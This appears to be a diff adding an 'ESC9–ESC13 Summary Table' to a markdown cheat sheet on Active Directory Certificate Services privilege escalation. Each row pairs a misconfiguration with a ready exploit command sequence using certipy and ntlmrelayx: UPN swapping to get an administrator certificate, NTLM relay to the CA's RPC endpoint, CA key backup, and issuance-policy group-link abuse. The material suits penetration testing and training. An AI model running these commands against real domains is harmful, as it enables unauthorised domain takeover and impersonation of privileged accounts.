@@ -81,6 +81,22 @@ Notes:
 
 ---
 
+## 2b. ESC9–ESC13 Summary Table
+
+These target the same weak-certificate-mapping and issuance-policy gaps that KB5014754 partially closed — ESC9/ESC10 exploit the *absence* of the SID security extension rather than relaying around it, and ESC11–ESC13 cover additional RPC/HSM/issuance-policy vectors documented after the original Certified Pre-Owned taxonomy.
+
+| ESC | Misconfiguration | Exploit command sequence (short form) |
+|---|---|---|
+| **ESC9** | Template has `CT_FLAG_NO_SECURITY_EXTENSION` set (no SID embedded in the cert) + weak certificate mapping on the DC. Requires `GenericWrite` on the victim account. | Temporarily flip victim's UPN to the target's UPN, request cert as victim, restore UPN, authenticate: `certipy account update -u attacker@domain -p pass -user victim -upn administrator@domain -dc-ip <IP>` → `certipy req -u victim@domain -p victimpass -ca CA_NAME -template ESC9template -dc-ip <IP>` → restore original UPN → `certipy auth -pfx victim.pfx -dc-ip <IP>` |
+| **ESC10** | Weak certificate-mapping **registry keys** (`CertificateMappingMethods`/`StrongCertificateBindingEnforcement`) on the DC itself, rather than a template flag | Same UPN-swap technique as ESC9, but targets the DC's cert-mapping configuration rather than a specific template |
+| **ESC11** | CA's ICPR RPC endpoint doesn't enforce `IF_ENCRYPT` → NTLM relay to RPC instead of HTTP (bypasses the EPA/channel-binding mitigations that closed most of ESC8 over HTTP) | `certipy relay -target 'rpc://<CA_host>' -ca CA_NAME -template DomainController` or `ntlmrelayx.py -t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name 'CA_NAME' -smb2support --template DomainController` |
+| **ESC12** | CA private key stored on an accessible smart-card HSM/registry-protected store — a shell on the CA server itself equals full PKI compromise | Post-exploitation credential/key extraction via `certutil`/DPAPI once you have code execution on the CA host, then `certipy ca -backup` |
+| **ESC13** | Certificate template's issuance policy OID is linked (via `msPKI-Certificate-Policy` → `msDS-OIDToGroupLink`) to a privileged AD group | `certipy find -u 'user@domain' -p 'password' -dc-ip <IP> -vulnerable -stdout` (look for the OID→group link) → `certipy req -u 'user@domain' -p 'password' -ca CA_NAME -template TEMPLATE_NAME` → `certipy auth -pfx cert.pfx` to inherit the linked group's access |
+
+**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html · https://www.hackingarticles.in/adcs-esc9-no-security-extension/ · https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/ · https://adminions.ca/books/adcs/page/esc13
+
+---
+
 ## 3. Worked examples
 
 ### 3.1 ESC1 — Enrollee-supplied subject, client-auth template
